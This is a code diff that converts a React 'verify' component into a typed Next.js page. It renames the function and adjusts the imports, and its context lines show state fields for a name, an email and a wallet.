@@ -1,7 +1,8 @@
-import React, { useState } from 'react'
+import type { NextPage } from 'next'
+import { useState } from 'react'
 import emailjs from 'emailjs-com'
 
-const verify = () => {
+const Verify: NextPage = () => {
   const [name, setName] = useState('')
   const [email, setEmail] = useState('')
   const [wallet, setWallet] = useState('')
@@ -111,4 +112,4 @@ const verify = () => {
   )
 }
 
-export default verify
+export default Verify
